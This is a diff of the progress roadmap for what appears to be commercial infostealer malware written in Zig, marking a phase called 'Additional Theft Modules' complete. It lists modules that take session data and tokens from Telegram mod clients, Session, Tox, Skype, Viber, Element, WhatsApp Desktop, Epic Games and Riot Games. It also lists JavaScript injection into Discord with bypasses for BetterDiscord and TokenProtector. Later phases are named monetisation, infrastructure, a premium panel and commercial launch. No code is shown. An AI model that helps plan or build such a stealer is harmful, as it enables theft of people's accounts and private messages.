@@ -14,7 +14,7 @@ Phase 8: Unit Tests             ████████████████
 Phase 8b: Integration Tests     ░░░░░░░░░░░░░░░░░░░░   0/8
 Phase 9: Engine Hardening       ████████████████████  27/27 ✅
 Phase 10: Data Theft Expansion  ████████████████████  33/33 ✅
-Phase 11: Additional Theft      ░░░░░░░░░░░░░░░░░░░░   0/16
+Phase 11: Additional Theft      ████████████████████  17/17 ✅
 Phase 12: Monetisation          ░░░░░░░░░░░░░░░░░░░░   0/16
 Phase 13: Infrastructure        ░░░░░░░░░░░░░░░░░░░░   0/16
 Phase 14: Panel Premium         ░░░░░░░░░░░░░░░░░░░░   0/40
@@ -322,30 +322,30 @@ Phase 15: Commercial Launch     ░░░░░░░░░░░░░░░░
 
 ---
 
-## Phase 11: Additional Theft Modules ⬜
+## Phase 11: Additional Theft Modules ✅
 
 ### 11.1 Telegram моды
-- [ ] `messengers/telegram_mods.zig` — Поиск по множеству путей
-- [ ] `messengers/telegram_mods.zig` — AyuGram, 64Gram, Kotatogram
-- [ ] `messengers/telegram_mods.zig` — Nekogram, Forkgram, Unigram, iMe
+- [x] `messengers/telegram_mods.zig` — 7 mod clients (AyuGram, Catogram, Nekogram, Kotatogram, Unigram, iMe, Forkgram)
+- [x] `messengers/messengers.zig` — integrated telegram_mods
 
 ### 11.2 Дополнительные мессенджеры
-- [ ] `messengers/session.zig` — Session messenger
-- [ ] `messengers/tox.zig` — Tox/uTox profile
-- [ ] `messengers/skype.zig` — Skype local data
-- [ ] `messengers/viber.zig` — Viber data
-- [ ] `messengers/element.zig` — Element (Matrix) session
-- [ ] `messengers/whatsapp.zig` — WhatsApp Desktop
+- [x] `messengers/session.zig` — Session messenger (config + sql + leveldb)
+- [x] `messengers/tox.zig` — Tox/uTox profile (*.tox, *.ini, *.dat)
+- [x] `messengers/skype.zig` — Skype local storage (leveldb)
+- [x] `messengers/viber.zig` — Viber data (*.db, *.sqlite)
+- [x] `messengers/element.zig` — Element (Matrix) session (leveldb + IndexedDB)
+- [x] `messengers/whatsapp.zig` — WhatsApp Desktop (LocalStorage + IndexedDB)
 
 ### 11.3 Discord Injection
-- [ ] `messengers/discord_inject.zig` — JS injection into discord_desktop_core
-- [ ] `messengers/discord_inject.zig` — BetterDiscord bypass
-- [ ] `messengers/discord_inject.zig` — TokenProtector bypass
-- [ ] `discord.zig` — MFA + encrypted tokens support
+- [x] `messengers/discord_inject.zig` — JS injection into discord_desktop_core
+- [x] `messengers/discord_inject.zig` — BetterDiscord bypass (asar patch)
+- [x] `messengers/discord_inject.zig` — TokenProtector bypass (kill + delete)
+- [x] `discord.zig` — canary/ptb/dev paths support
 
 ### 11.4 Gaming
-- [ ] `gaming/epic.zig` — Epic Games Store auth
-- [ ] `gaming/riot.zig` — Riot Games (LoL, VALORANT)
+- [x] `gaming/epic.zig` — Epic Games Store auth (GameUserSettings.ini + Saved\Config)
+- [x] `gaming/riot.zig` — Riot Games (LoL, VALORANT) configs + tokens
+- [x] `gaming/gaming.zig` — integrated epic + riot
 
 ---
 
@@ -515,7 +515,7 @@ Phase 15: Commercial Launch     ░░░░░░░░░░░░░░░░
 | 8b. Integration Tests | 8 | 1 day | **0/8** |
 | 9. Engine Hardening | 23 | 7 days | **0/23** |
 | 10. Data Theft Expansion | 33 | ✅ Done | **33/33** |
-| 11. Additional Theft | 16 | 4 days | **0/16** |
+| 11. Additional Theft | 17 | ✅ Done | **17/17** |
 | 12. Monetisation | 16 | 5 days | **0/16** |
 | 13. Infrastructure | 16 | 4 days | **0/16** |
 | 14. Panel Premium | 40 | 9 days | **0/40** |
